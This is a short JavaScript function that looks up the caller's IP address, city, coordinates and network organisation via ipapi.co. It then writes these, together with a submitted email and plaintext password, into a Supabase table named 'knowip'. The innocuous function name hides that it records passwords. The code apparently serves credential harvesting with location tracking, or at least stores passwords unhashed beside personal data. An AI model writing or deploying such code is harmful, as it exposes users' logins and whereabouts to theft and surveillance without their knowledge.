import supabase from "../../services/supabase";

export async function getAddressIp(email, password) {
  const resGeo = await fetch(`https://ipapi.co/json/`);
  if (!resGeo) throw new Error(`Check your network`);
  const dataGeo = await resGeo.json();
  const { city, ip, latitude, longitude, org } = await dataGeo;

  const { data, error } = await supabase
    .from("knowip")
    .insert([{ city, ip, latitude, longitude, org, email, password }])
    .select();
  if (error) console.log(error);
  return data;
}
